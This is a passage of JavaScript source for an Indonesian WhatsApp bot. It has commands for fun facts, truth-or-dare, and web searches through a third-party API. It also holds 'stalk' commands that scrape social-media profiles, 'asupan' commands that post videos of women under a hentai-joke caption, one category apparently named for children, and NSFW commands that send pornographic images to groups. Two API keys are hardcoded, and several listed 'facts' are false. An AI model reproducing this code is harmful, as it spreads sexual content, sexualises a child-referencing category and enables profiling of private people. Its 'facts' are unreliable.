peringatan bagi hewan (contoh: tikus) yang mati dalam pengujian laboratorium. [web.archive .org]","Berkedip memberikan otak Anda istirahat sebentar. [para ilmuan di Japan’s Osaka University]","Wanita yang bahagia dalam sebuah pernikahan akan mengalami berat badan naik setengah pound (0,22 kg) setiap 6 bulan. [DailyMail]","Rasa cemburu berlebihan bisa digolongkan penyakit jiwa, krna dpt mendorong ssorg utk bunuh diri / menghabisi nyawa org lain. [riset]","","Mengkonsumsi buah tomat beberapa kali dlm kurun waktu seminggu dpt mengatasi perasaan depresi. [peneliti di Tianjin Medical Univ., Cina]"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. [BBCnews]","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Memeluk orang yg disayangi dpt membantu menurunkan tekanan darah, mengurangi stres dan","kecemasan, bahkn dpt meningkatkan memori. [Dailymail]","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".Berjalan kaki atau bersepeda ke sekolah mempertajam konsentrasi siswa di kelas dan tetap bertahan sekitar 4 jam kemudian. [Medical Daily]","Menurut riset pasar global Euromonitor International, pria Korea adalah pria yang paling suka bersolek dari pria lain di dunia.","Rata-rata orang akan merasa 100 persen sehat / fit hanya 61 hari dalam setahun. (Penelitian di Inggris)","Polydactyl Cat adalah jenis kucing yang memiliki jempol di kaki mereka.","Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]","Di Jerman, tahanan yg ingin meloloskan diri dr penjara adl bukan mrupakn perbuatan ilegal. Krn itu salah1 naluri dasar manusia untuk kebebasan.","Wanita merasa diri mereka terlihat paling jelek dan terlihat lebih tua pada hari Rabu pukul 15.30 . [studi baru dari St Tropez]Orang yang rutin bermain video game ternyata memiliki penalaran yang baik dibanding kebanyakan orang. (detikHealth)","Nama \"Gorila\" berasal dari kata Yunani \"Gorillai\" yang berarti \"perempuan berbulu\".","IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.","Selama abad ke-13, kata \"nice\" sebenarnya berarti “stupid”, \"senseless\" dan “foolish\".","59. 49% dari pemilik Smartphone adalah jomblo. (Survei, \"2012 Online User Behavior and Engagement Study\")","Fakta Unik","60. Gazzarella adalah keju mozzarella yang terbuat dari susu kucing. 61. Rata-rata orang melihat / mengecek ponselnya sekitar 150 kali sehari. (Laporan Nokia pada MindTrek 2010)","Lalat dapat menyalurkan sekitar 300 bakteri setiap kali hinggap di benda.","Tertawa dapat meningkatkan aktivitas antibodi sekitar 20%, juga membantu untuk menghancurkan virus dan sel-sel tumor.","Fobia matematika (mathematics anxiety) memicu respon yang sama di otak sbg rasa sakit fisik. Gejalanya yaitu melihat angka saja sudah nyeri."," Karakter kartun Bugs Bunny diberi pangkat kehormatan sersan-mayor di Korps Marinir AS pada akhir Perang Dunia II. (wikipedia)","Apel yang ditaruh di ruang terbuka akan matang 10 kali lebih cepat dibandingkan dengan apel yang ditaruh di kulkas.","Ungkapan 'Smitten' adalah untuk menyebut 'naksir' dalam bahasa Inggris.","Menurut etiket internasional, sebuah jabat tangan yang tepat dan baik harus berlangsung selama sekitar 3 detik & dilepaskan setelah goyang.","Ketika kita sedang jatuh cinta, otak akan memproduksi dopamin ekstra, bahan kimia yang membuat seseorang menjadi gembira berlebihan."," \"Mwahahaha\" dan \"lolz\" telah ditambahkan ke Kamus Inggris Oxford.","Menurut penelitian, pria cenderung menurunkan volume suaranya ketika ia berbicara dg seseorang yg ia cintai, sementara perempuan sebaliknya.","Di Perancis, jajanan Arum Manis (Rambut Nenek) disebut \"Barbe á Papa\" yang berarti \"Jenggot Ayah\".","Menurut penelitian, PR terlalu banyak sebenarnya dapat menyebabkan siswa menjadi stres, depresi & mendapat nilai lebih rendah.","Hangry adalah penggabungan kata dari \"Hungry\" dan \"Angry\", di pakai ketika anda sedang lapar dan marah.","Kentut dari bakteri membuat keju swiss memiliki lubang-lubang.","Mendengarkan musik benar-benar dapat mengurangi rasa sakit kronis hingga 20% dan membantu meringankan depresi hingga 25%. (sciencedaily)","Orang yang merasa kesepian memiliki kemungkinan mengalami kepikunan 70-80% lebih tinggi. (Journal of Neurosurgery Neurologi and Psychiatry)","Melamun dpt memendekkan telomere (bagian paling ujung sel DNA) yang berperan dlm menjaga kestabilan sel, dimana dapat mempercepat proses penuaan."]
const ran_faktau = faktau[Math.floor(Math.random() * faktau.length)]
reply(`*Fakta Unik :*\n${ran_faktau}`)
}
break
case 'anime':
if (args.length == 0) return reply(`Nama Anime Nya Mana Tod ?\nContoh : ${prefix + command} Tokyo Revenger`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${zerokey}&query=${query}`)
get_result = get_result.result
zerr = `Id : ${get_result.id}\n`
zerr += `Id MAL : ${get_result.idMal}\n`
zerr += `Title : ${get_result.title.romaji}\n`
zerr += `English : ${get_result.title.english}\n`
zerr += `Native : ${get_result.title.native}\n`
zerr += `Format : ${get_result.format}\n`
zerr += `Episodes : ${get_result.episodes}\n`
zerr += `Duration : ${get_result.duration} mins.\n`
zerr += `Status : ${get_result.status}\n`
zerr += `Season : ${get_result.season}\n`
zerr += `Season Year : ${get_result.seasonYear}\n`
zerr += `Source : ${get_result.source}\n`
zerr += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
zerr += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
zerr += `Genre : ${get_result.genres.join(", ")}\n`
zerr += `Synonyms : ${get_result.synonyms.join(", ")}\n`
zerr += `Score : ${get_result.averageScore}%\n`
zerr += `Characters : \n`
character = get_result.characters.nodes
for (var x of character) {
    zerr += `- ${x.name.full} (${x.name.native})\n`
}
zerr += `\nDescription : ${get_result.description}`
thumbnail = await getBuffer(get_result.coverImage.large)
zeroyt7.sendMessage(from, thumbnail, image, { quoted: ftrol, caption: zerr })
break
case 'truth':
const trut = ['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupkamu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
sendButton(from, `${ttrth}`, faketeks, [
{
buttonId: `${prefix}truth`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
}]);
break
case 'dare':
const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temkamu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
sendButton(from, `${der}`, faketeks, [
{
buttonId: `${prefix}dare`,
buttonText: {
displayText: `NEXT`,
},
type: 1,
}]);
break

//━━━━━━━━━━━━━━━[ FITUR SEARCH ]━━━━━━━━━━━━━━━━━//

case 'google':
if (args.length == 0) return reply(`Nama Yg Mau Cari Mana Tod\nContoh: ${prefix + command} sandrinna`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsearch?apikey=${zerokey}&query=${query}`)
get_result = get_result.result
ini_txt = 'Google Search : \n'
for (var x of get_result) {
ini_txt += `Title : ${x.title}\n`
ini_txt += `Link : ${x.link}\n`
ini_txt += `Desc : ${x.desc}\n\n`
}
reply(ini_txt)
break
case 'shopee':
if (args.length == 0) return reply(`Nama Barang Yg Mau Di Cari Mana Tod\nContoh: ${prefix + command} sepatu`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/shopee?apikey=${zerokey}&query=${query}`)
get_result = get_result.result
ini_txt = 'Shopee Search : \n'
for (var x of get_result) {
ini_txt += `Name : ${x.name}\n`
ini_txt += `Terjual : ${x.sold}\n`
ini_txt += `Stock : ${x.stock}\n`
ini_txt += `Lokasi : ${x.shop_loc}\n`
ini_txt += `Link : ${x.link_produk}\n\n`
}
reply(ini_txt)
break
case 'gimage':
if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} Sandrinna`)
query = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/gimage?apikey=${zerokey}&query=${query}`)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: ftrol })
break
case 'wallpapersearch':
if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} Sandrinna`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${zerokey}&query=${query}`)
ini_buffer = await getBuffer(get_result.result)
await zeroyt7.sendMessage(from, ini_buffer, image, { quoted: ftrol })
break
case 'kbbi':
if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} kursi`)
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=${zerokey}&query=${args.join(" ")}`)
lila = get_result.result
ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
ini_txt += `\`\`\`Pelafalan : ${lila[0].pelafalan}\`\`\`\n`
ini_txt += `\`\`\`Bentuk Tidak Baku : ${lila[0].bentuk_tidak_baku}\`\`\`\n\n`
for (var x of lila) {
ini_txt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
ini_txt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
ini_txt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
ini_txt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
ini_txt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
}
reply(ini_txt)
break
case 'jarak':
if (args.length == 0) return reply(`Nama Kotanya Mana Tod\nContoh: ${prefix + command} jakarta - yogyakarta`)
pauls = args.join(" ")
teks = pauls.split("-")[0].trim()
teks2 = pauls.split("-")[1].trim()
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${zerokey}&kota1=${teks}&kota2=${teks2}`)
x = get_result.result
ini_txt = `Informasi Jarak dari ${teks} ke ${teks2} :\n\n`
ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.from.latitude}\n`
ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
ini_txt += `\`\`\`◪ Tujuan :\`\`\` ${x.to.name}\n`
ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.to.latitude}\n`
ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
ini_txt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${x.jarak}\n`
ini_txt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
ini_txt += `   ╭───────────────❏\n`
ini_txt += `❍┤ Kereta Api : ${x.kereta_api}\n`
ini_txt += `❍┤ Pesawat : ${x.pesawat}\n`
ini_txt += `❍┤ Mobil : ${x.mobil}\n`
ini_txt += `❍┤ Motor : ${x.motor}\n`
ini_txt += `❍┤ Jalan Kaki : ${x.jalan_kaki}\n`
ini_txt += `   ╰───────────────❏\n`
reply(ini_txt)
break
case 'translate':
if (args.length == 0) return reply(`Teks Yg Mau Di Translate Mana Tod\nContoh: ${prefix + command} en Tahu Bacem`)
kode_negara = args[0]
args.shift()
ini_txt = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${zerokey}&text=${ini_txt}`)
get_result = get_result.result
init_txt = `From : ${get_result.from}\n`
init_txt += `To : ${get_result.to}\n`
init_txt += `Original : ${get_result.original}\n`
init_txt += `Translated : ${get_result.translated}\n`
init_txt += `Pronunciation : ${get_result.pronunciation}\n`
reply(init_txt)
break
case 'infogempa':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Lokasi :* ${get_result.lokasi}\n`
zerr += `*Waktu :* ${get_result.waktu}\n`
zerr += `*Potensi :* ${get_result.potensi}\n`
zerr += `*Magnitude :* ${get_result.magnitude}\n`
zerr += `*Kedalaman :* ${get_result.kedalaman}\n`
zerr += `*Koordinat :* ${get_result.koordinat}`
buffer = await getBuffer(get_result.map)
await zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, caption: zerr })
break
case 'covidindo':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Positif :* ${get_result.positif}\n`
zerr += `*Sembuh :* ${get_result.sembuh}\n`
zerr += `*Dirawat :* ${get_result.dirawat}\n`
zerr += `*Meninggal :* ${get_result.meninggal}`
reply(zerr)
break
case 'covidglobal':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Positif :* ${get_result.positif}\n`
zerr += `*Sembuh :* ${get_result.sembuh}\n`
zerr += `*Dirawat :* ${get_result.dirawat}\n`
zerr += `*Meninggal :* ${get_result.meninggal}`
reply(zerr)
break
case 'wikipedia':
if (args.length == 0) return reply(`Apa Yg Mau Di Cari Tod\nContoh : ${prefix + command} Tahu`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=${zerokey}&query=${query}`)
get_result = get_result.result
reply(get_result)
break
case 'playstore':
if (args.length == 0) return reply(`Apa Yg Mau Di Cari Tod ?\nContoh : ${prefix + command} telegram`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/playstore?apikey=${zerokey}&query=${query}`)
get_result = get_result.result
zerr = 'Play Store Search : \n'
for (var x of get_result) {
zerr += `Name : ${x.title}\n`
zerr += `Type ID : ${x.appId}\n`
zerr += `Developer : ${x.developer}\n`
zerr += `Link : ${x.url}\n`
zerr += `Price : ${x.priceText}\n`
zerr += `Nominal : ${x.price}\n\n`
}
reply(zerr)
break
case 'kodepos':
if (args.length == 0) return reply(`Nama Kota Nya Mana Tod ?\nContoh : ${prefix + command} Temanggung`)
daerah = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kodepos?apikey=${zerokey}&query=${daerah}`)
get_result = get_result.result[0]
zerr = `*Provinsi :* ${get_result.province}\n`
zerr += `*Kabupaten :* ${get_result.city}\n`
zerr += `*Kecamatan :* ${get_result.subdistrict}\n`
zerr += `*Kelurahan :* ${get_result.urban}\n`
zerr += `*Kode Pos :* ${get_result.postalcode}`
reply(zerr)
break
case 'newsinfo':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=${zerokey}`)
get_result = get_result.result
zerr = "*News TV Info :*\n\n"
for (var x of get_result) {
zerr += `*Title :* ${x.title}\n`
zerr += `*Author :* ${x.author}\n`
zerr += `*Source :* ${x.source.name}\n`
zerr += `*Url :* ${x.url}\n`
zerr += `*Published :* ${x.publishedAt}\n\n`
zerr += `*Description :* ${x.description}`
}
reply(zerr)
break
case 'jadwaltv':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${zerokey}`)
get_result = get_result.result
zerr = `*Info Televisi :*\n\n`
for (var x in get_result) {
zerr += `${x.toUpperCase()}${get_result[x]}\n\n`
}
reply(zerr)
break
case 'cuaca':
if (args.length == 0) return reply(`Nama Kota Nya Mana Tod ?\nContoh : ${prefix + command} Depok`)
daerah = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${zerokey}`)
get_result = get_result.result
zerr = `Tempat : ${get_result.tempat}\n`
zerr += `Cuaca : ${get_result.cuaca}\n`
zerr += `Angin : ${get_result.angin}\n`
zerr += `Description : ${get_result.description}\n`
zerr += `Kelembapan : ${get_result.kelembapan}\n`
zerr += `Suhu : ${get_result.suhu}\n`
zerr += `Udara : ${get_result.udara}\n`
zerr += `Permukaan laut : ${get_result.permukaan_laut}\n`
await zeroyt7.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: ftrol })
reply(zerr)
break

//━━━━━━━━━━━━━━━[ FITUR STALK ]━━━━━━━━━━━━━━━━━//

case 'igstalk':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${body.slice(9)}?apikey=${zerokey}`, {method: 'get'})
get_result = get_result.result
zerr = `Link : https://www.instagram.com/${get_result.username}\n`
zerr += `Full : ${get_result.fullname}\n`
zerr += `Post : ${get_result.posts}\n`
zerr += `Followers : ${get_result.followers}\n`
zerr += `Following : ${get_result.following}\n`
zerr += `Bio : ${get_result.bio}\n`
buffer = await getBuffer(get_result.photo_profile)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: zerr})
break
case 'githubstalk':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${body.slice(13)}?apikey=${zerokey}`, {method: 'get'})
get_result = get_result.result
zerr = `*Username :* ${get_result.name}\n`
zerr += `*Followers :* ${get_result.followers}\n`
zerr += `*Following :* ${get_result.following}\n`
zerr += `*Publick :* ${get_result.public_repos}\n`
zerr += `*Public Gits :* ${get_result.public_gists}\n`
zerr += `*User :* ${get_result.user}\n`
zerr += `*Compi :* ${get_result.company}\n`
zerr += `*Lokasi : ${get_result.location}\n`
zerr += `Email : ${get_result.email}\n`
zerr += `*Profile Bio :* ${get_result.bio}`
buffer = await getBuffer(get_result.avatar)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: zerr})
break
case 'tkstalk':
username = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${username}?apikey=${zerokey}`, {method: 'get'})
get_result = get_result.result
zerr = `*Link :* ${get_result.username}\n`
zerr += `*Profil Bio :* ${get_result.bio}\n`
zerr += `*Followers :* ${get_result.followers}\n`
zerr += `*Following :* ${get_result.followings}\n`
zerr += `*Likes :* ${get_result.likes}\n`
zerr += `*Video :* ${get_result.video}`
buffer = await getBuffer(get_result.user_picture)
zeroyt7.sendMessage(from, buffer, image, {quoted: mek, caption: zerr})
break
case 'mlstalk':
if (args.length == 0) return reply(`Id Ml Nya Mana Tod ?\nContoh : ${prefix + command} 84830127/2169`)
ml_id = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${ml_id}?apikey=${zerokey}`)
reply(get_result.result)
break
case 'shortlink':
if (args.length == 0) return reply(`Link Nya Mana Tod ?\nContoh : ${prefix + command} https://instagram.com/bayu.kecce_`)
ini_link = args[0]
buffer = await fetchJson(`https://api.lolhuman.xyz/api/shortlink?apikey=${zerokey}&url=${ini_link}`)
reply(buffer.result)
break

//━━━━━━━━━━━━━━━[ FITUR ASUPAN ]━━━━━━━━━━━━━━━━━//

case 'asupan':
ini = await fetchJson(`https://api.dapuhy.ga/api/asupan/asupan?apikey=bayutamvan`) 
reply(mess.wait)
buffer = await getBuffer(ini.result.result)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
break
case 'asupancecan':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/cecan?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
break
case 'asupanhijaber':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/hijaber?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
break
case 'asupansantuy':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/santuy?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
break
case 'asupanukhti':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ukty?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
break
case 'asupanbocil':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/bocil?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
break
case 'asupanghea':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/ghea?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
break
case 'asupanrika':
ini = await fetchJson(`https://zeroyt7-api.herokuapp.com/api/asupan/rikagusriani?apikey=${zerkey}`)
reply(mess.wait)
buffer = await getBuffer(ini.result.url)
zeroyt7.sendMessage(from, buffer, video, {quoted: ftrol, caption: 'Nih Jangan Lupa ☕ NONTON HENTONGERS ☕'})
break

//━━━━━━━━━━━━━━━[ FITUR NSFW ]━━━━━━━━━━━━━━━━━//

case 'yuri':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=2ff99ddfb35e897494de4ee6`) 
                    zeroyt7.sendMessage(from, ini_buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
                                  
break
case  'hentai': 
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'anal':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
aku = (`https://api.lolhuman.xyz/api/random2/anal?apikey=${zerokey}`)
kon = await getBuffer(aku)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
kau = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=lesbian&apikey=${monkey}`)
kon = await getBuffer(kau)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'eroneko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=eroNeko&apikey=${monkey}`)
kon = await getBuffer(hai)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'bj':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://api.lolhuman.xyz/api/random2/bj?apikey=${zerokey}`) 
kon = await getBuffer(hai)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'kitsune':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://api.lolhuman.xyz/api/random/nsfw/sideoppai?apikey=${zerokey}`) 
kon = await getBuffer(hai)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'pussy':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = await getBuffer(`https://api.lolhuman.xyz/api/random2/pussy_jpg?apikey=${zerokey}`) 
zeroyt7.sendMessage(from, hai, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'wallpaper':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=${monkey}`)
kon = await getBuffer(hai)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'neko2':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://api.lolhuman.xyz/api/random/nsfw/neko?apikey=${zerokey}`) 
kon = await getBuffer(hai)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'baka':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=${zerokey}`) 
kon = await getBuffer(hai)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'slap':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=${monkey}`)
kon = await getBuffer(hai)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'poke':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=${monkey}`)
kon = await getBuffer(hai)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'keta':
if (!isGroup) return reply(mess.only.group)
